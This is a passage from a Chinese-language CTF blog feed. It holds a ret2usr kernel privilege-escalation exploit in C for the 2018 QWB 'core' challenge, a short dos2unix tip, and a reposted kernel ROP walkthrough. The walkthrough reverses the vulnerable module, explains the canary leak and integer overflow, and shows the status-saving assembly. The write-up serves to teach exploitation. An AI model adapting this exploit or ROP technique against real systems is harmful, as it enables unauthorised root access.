fopen(&quot;./test_kallsyms&quot;, &quot;r&quot;); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf(&quot;vmlinux_base addr: %p\n&quot;, vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">    <span class="comment">/* puts(&quot;[*] root now.&quot;); */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="keyword">size_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">size_t</span> buf[<span class="number">0x40</span>/<span class="number">8</span>];</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = buf[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]canary : %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    rop[<span class="number">8</span>] = canary ;</span><br><span class="line">    rop[<span class="number">10</span>] = (<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    rop[<span class="number">11</span>] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">13</span>] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret;</span></span><br><span class="line">    rop[<span class="number">14</span>] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    rop[<span class="number">15</span>] = user_cs;</span><br><span class="line">    rop[<span class="number">16</span>] = user_rflags;</span><br><span class="line">    rop[<span class="number">17</span>] = user_sp;</span><br><span class="line">    rop[<span class="number">18</span>] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] DEBUG: &quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    write(fd, rop, <span class="number">0x30</span> * <span class="number">8</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><ol><li>通过读取 <code>/tmp/kallsyms</code> 获取 <code>commit_creds</code> 和 <code>prepare_kernel_cred</code> 的方法相同,同时根据这些偏移能确定 gadget 的地址。</li><li>leak canary 的方法也相同,通过控制全局变量 <code>off</code> 读出 canary。</li><li>与 kernel rop 做法不同的是 rop 链的构造<ol><li>kernel rop 通过 内核空间的 rop 链达到执行 <code>commit_creds(prepare_kernel_cred(0))</code> 以提权目的,之后通过 <code>swapgs; iretq</code> 等返回到用户态,执行用户空间的 <code>system(&quot;/bin/sh&quot;)</code> 获取 shell</li><li>ret2usr 做法中,直接返回到用户空间构造的 <code>commit_creds(prepare_kernel_cred(0))</code> （通过函数指针实现）来提权,虽然这两个函数位于内核空间,但此时我们是 <code>ring 0</code> 特权,因此可以正常运行。之后也是通过 <code>swapgs; iretq</code> 返回到用户态来执行用户空间的 <code>system(&quot;/bin/sh&quot;)</code></li></ol></li></ol><p>从这两种做法的比较可以体会出之所以要 <code>ret2usr</code>,是因为一般情况下在用户空间构造特定目的的代码要比在内核空间简单得多</p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows和Linux文件编码格式问题</title>
      <link href="/tool-ubuntu-shell-format/"/>
      <url>/tool-ubuntu-shell-format/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>为了装环境使用了师兄的脚本, 结果师兄的脚本是在windows下写的, Windows下回车是<code>\r\n</code>, 而Linux下只有<code>\n</code>结果就报错了。</p><h2 id="dos2unix"><a href="#dos2unix" class="headerlink" title="dos2unix"></a>dos2unix</h2><p><a href="http://manpages.ubuntu.com/manpages/cosmic/zh_CN/man1/dos2unix.1.html">dos2unix软件包</a>是Unix文件格式转换器, 包括工具”dos2unix” 和”unix2dos”, 用于将纯文本文件在DOS或Mac格式与Unix格式之间相互转换。用apt直接下载即可。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install dos2unix</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Kernel ROP</title>
      <link href="/note-pwn-kernel-rop/"/>
      <url>/note-pwn-kernel-rop/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载自 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_rop-zh/">CTF Wiki kernel rop</a> 根据学习情况略有修改</p><h2 id="2018-强网杯-core"><a href="#2018-强网杯-core" class="headerlink" title="2018 强网杯-core"></a>2018 强网杯-core</h2><blockquote><p>题目给的vmlinux好像有点问题,ropper出来基地址不一样,请使用下面的<code>extract-vmlinux</code>提取vmlinux</p></blockquote><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>题目给了四个文件: <code>bzImage</code>, <code>core.cpio</code>,<code>start.sh</code>以及<code>vmlinux</code></p><p>其中<code>vmlinux</code>信息如下:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=205c9e8b26bc8e0575a11029310d2ac00844f97c, not stripped</span><br></pre></td></tr></table></figure><p>静态链接,没有除去符号表。可以认为<code>vmlinux</code>是未经过压缩的kernel文件,而<code>bzImage</code>可以理解未压缩后的文件。具体可以看<a href="https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml">What is the difference between the following kernel Makefile terms: vmLinux, vmlinuz, vmlinux.bin, zimage &amp; bzimage?</a></p><p>vmlinux未经压缩,因此我们可以从中找到一些<code>gadge</code>以便利用, 这里wiki作者推荐使用<a href="https://github.com/sashs/Ropper">Ropper</a>来寻找<code>gadget</code>, 而不是<a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200720103821745.png" alt="image-20200720103821745"></p><p>如果题目没有给<code>vmlinux</code>,可以使用<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a>来提取</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CISCN2017_babydriver ./extract-vmlinux ./bzImage &gt; vmlinux</span><br><span class="line">CISCN2017_babydriver file vmlinux</span><br><span class="line">vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=e993ea9809ee28d059537a0d5e866794f27e33b4, stripped</span><br></pre></td></tr></table></figure><p>看一下<code>start.sh</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200720110459413.png" alt="image-20200720110459413"></p><p>发现内核开启<code>kaslr</code>保护</p><p>解压<code>core.cpio</code>后,看一下<code>init</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  give_to_player file core.cpio</span><br><span class="line">core.cpio: gzip compressed data, last modified: Fri Mar 23 13:41:13 2018, max compression, from Unix</span><br><span class="line">➜  give_to_player mkdir core</span><br><span class="line">➜  give_to_player <span class="built_in">cd</span> core</span><br><span class="line">➜  core mv ../core.cpio core.cpio.gz</span><br><span class="line">➜  core gunzip ./core.cpio.gz</span><br><span class="line">➜  core cpio -idm &lt; ./core.cpio</span><br><span class="line">104379 blocks</span><br><span class="line">➜  core bat init</span><br><span class="line">───────┬─────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: init</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ <span class="comment">#!/bin/sh</span></span><br><span class="line">   2   │ mount -t proc proc /proc</span><br><span class="line">   3   │ mount -t sysfs sysfs /sys</span><br><span class="line">   4   │ mount -t devtmpfs none /dev</span><br><span class="line">   5   │ /sbin/mdev -s</span><br><span class="line">   6   │ mkdir -p /dev/pts</span><br><span class="line">   7   │ mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">   8   │ chmod 666 /dev/ptmx</span><br><span class="line">   9   │ cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">  10   │ <span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">  11   │ <span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">  12   │ ifconfig eth0 up</span><br><span class="line">  13   │ udhcpc -i eth0</span><br><span class="line">  14   │ ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">  15   │ route add default gw 10.0.2.2</span><br><span class="line">  16   │ insmod /core.ko</span><br><span class="line">  17   │</span><br><span class="line">  18   │ poweroff -d 120 -f &amp;</span><br><span class="line">  19   │ setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">  20   │ <span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">  21   │ umount /proc</span><br><span class="line">  22   │ umount /sys</span><br><span class="line">  23   │</span><br><span class="line">  24   │ poweroff -d 0  -f</span><br><span class="line">───────┴─────────────────────────────────────────────────────────────────</span><br><span class="line">➜  core</span><br></pre></td></tr></table></figure><p>其中:</p><ul><li>第 9 行中<code>kallsyms</code>的内容保存到了<code>/tmp/kallsyms</code>中,那么我们就能从<code>/tmp/kallsyms</code>中读取<code>commit_creds</code>,<code>prepare_kernel_cred</code>的函数的地址了</li><li>第 10 行把<code>kptr_restrict</code>设为 1,这样就不能通过<code>/proc/kallsyms</code>查看函数的地址,但是第 9 行已经把其中的信息保存到了一个可读的文件,这句就无关紧要了</li><li>第 11 行把<code>dmesg_restrict</code>设为 1, 这样就不能通过<code>dmesg</code>查看kernel的信息了</li><li>第 18 行设置了定时关机, 为了避免做题时产生干扰,直接把这句删掉以后重新打包,方便我们分析</li></ul><p>同时发现一个 shell 脚本<code>gen_cpio.sh</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  core bat gen_cpio.sh</span><br><span class="line">───────┬─────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: gen_cpio.sh</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ find . -print0 \</span><br><span class="line">   2   │ | cpio --null -ov --format=newc \</span><br><span class="line">   3   │ | gzip -9 &gt; <span class="variable">$1</span></span><br><span class="line">───────┴─────────────────────────────────────────────────────────────────</span><br><span class="line">➜  core</span><br></pre></td></tr></table></figure><p>从名称和内容都可以看出这是一个方便打包的脚本,我们修改好init后重新打包,尝试运行 kernel</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  core nano init</span><br><span class="line">➜  core rm core.cpio</span><br><span class="line">➜  core ./gen_cpio.sh core.cpio</span><br><span class="line">.</span><br><span class="line">./bin</span><br><span class="line">./bin/ash</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">./vmlinux</span><br><span class="line">105403 blocks</span><br><span class="line">➜  core ls</span><br><span class="line">bin        core.ko  gen_cpio.sh  lib    linuxrc  root  sys  usr</span><br><span class="line">core.cpio  etc      init         lib64  proc     sbin  tmp  vmlinux</span><br><span class="line">➜  core mv core.cpio ..</span><br><span class="line">➜  core <span class="built_in">cd</span> ..</span><br><span class="line">➜  give_to_player ./start.sh</span><br><span class="line">qemu-system-x86_64: warning: TCG doesn<span class="string">&#x27;t support requested feature: CPUID.01H:ECX.vmx [bit 5]</span></span><br><span class="line"><span class="string">[    0.027857] Spectre V2 : Spectre mitigation: LFENCE not serializing, switching to generic retpoline</span></span><br><span class="line"><span class="string">udhcpc: started, v1.26.2</span></span><br><span class="line"><span class="string">udhcpc: sending discover</span></span><br><span class="line"><span class="string">udhcpc: sending select for 10.0.2.15</span></span><br><span class="line"><span class="string">udhcpc: lease of 10.0.2.15 obtained, lease time 86400</span></span><br><span class="line"><span class="string">/ $</span></span><br></pre></td></tr></table></figure><p>但这时候又遇到了新问题,内核运行不起来,从报错信息中能看到是因为分配的内存过小, <code>start.sh</code>中<code>-m</code>分配是<code>64M</code>,修改为<code>128M</code>,就能运行起来了。</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200720113020077.png" alt="image-20200720113020077"></p><p>对模块进行检查</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  give_to_player check --file core.ko</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE</span><br><span class="line">No RELRO        Canary found      NX enabled    Not an ELF file   No RPATH   No RUNPATH   core.ko</span><br></pre></td></tr></table></figure><p>开启了<code>Canary</code>保护,用 IDA 打开<code>core.ko</code>进行分析</p><p>主要函数如下:</p><ul><li>core_release</li><li>core_write</li><li>core_read</li><li>core_copy_func</li><li>core_ioctl</li><li>exit_core</li></ul><p>其中:</p><p>**init_module()**注册<code>/proc/core</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: created /proc/core entry\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**exit_core()**删除<code>/proc/core</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">exit_core</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( core_proc )</span><br><span class="line">    result = remove_proc_entry(<span class="string">&quot;core&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_ioctl()</strong> 定义了三条命令,分别调用 <strong>core_read()</strong> , <strong>core_copy_func()</strong> 和设置全局变量 <strong>off</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">core_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = v3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(v3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_read()</strong> 从 <code>v4[off]</code> 拷贝 64 个字节到用户空间, 但要注意的是全局变量<code>off</code>使我们能够控制的,因此可以合理的控制<code>off</code>来<code>leak canary</code>和一些地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">core_read</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  __int64 *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 = (__int64 *)((<span class="keyword">char</span> *)v2 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;v5, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(v1, (<span class="keyword">char</span> *)&amp;v5 + off, <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_copy_func()</strong> 从全局变量<code>name</code>中拷贝数据到局部变量中,长度是由我们指定的,但要注意的是 qmemcpy 用的是 <code>unsigned __int16</code>,但传递的长度是 <code>signed __int64</code>,因此如果控制传入的长度为 <code>0xffffffffffff0000|(0x100)</code> 等值,就可以栈溢出了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">core_copy_func</span><span class="params">(<span class="keyword">signed</span> __int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">    printk(<span class="string">&quot;\x016Detect Overflow&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    qmemcpy(v1, name, (<span class="keyword">unsigned</span> __int16)a1);    <span class="comment">// overflow</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_write()</strong> 向全局变量 <code>name</code> 上写,这样通过 <code>core_write()</code> 和 <code>core_copy_func()</code> 就可以控制 <code>Ropchain</code> 了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(name, a2, v3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: error copying data from userspacen&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>经过如上的分析,可以得出以下的思路:</p><ol><li>通过 ioctl 设置 off,然后通过 core_read() leak 出 canary</li><li>通过 core_write() 向 name 写,构造 ropchain</li><li>通过 core_copy_func() 从 name 向局部变量上写,通过设置合理的长度和 canary 进行 rop</li><li>通过 rop 执行 <code>commit_creds(prepare_kernel_cred(0))</code></li><li>返回用户态,通过 system(“/bin/sh”) 等起 shell</li></ol><p>解释:</p><ul><li>如何获得 commit_creds(),prepare_kernel_cred() 的地址？<ul><li>/tmp/kallsyms 中保存了这些地址,可以直接读取,同时根据偏移固定也能确定 gadgets 的地址</li></ul></li><li>如何返回用户态？<ul><li><code>swapgs; iretq</code>,需要设置 <code>cs, rflags</code> 等信息,可以写一个函数保存这些信息</li></ul></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// intel flavor assembly</span></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// at&amp;t flavor assembly</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_stats</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">    <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">    <span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">    <span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">    :<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_eflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line">    :</span><br><span class="line">    : <span class="string">&quot;memory&quot;</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>为什么要这么麻烦返回用户态呢？<ul><li>我们想做的大多数有用的事情在用户态那里要容易得多</li><li>在内核空间里,我们很难:<ul><li>修改文件系统</li><li>创建一个新的进程</li><li>创建网络连接</li></ul></li></ul></li></ul><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>qemu 内置有 gdb 的接口, 可以通过 help 进行查看</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  qwb2018-core qemu-system-x86_64 --<span class="built_in">help</span> |grep gdb</span><br><span class="line">-gdb dev        <span class="built_in">wait</span> <span class="keyword">for</span> gdb connection on <span class="string">&#x27;dev&#x27;</span></span><br><span class="line">-s              shorthand <span class="keyword">for</span> -gdb tcp::1234</span><br></pre></td></tr></table></figure><p>即可以通过 <code>-gdb tcp:port</code> 来指定,也可以 <code>-s</code> 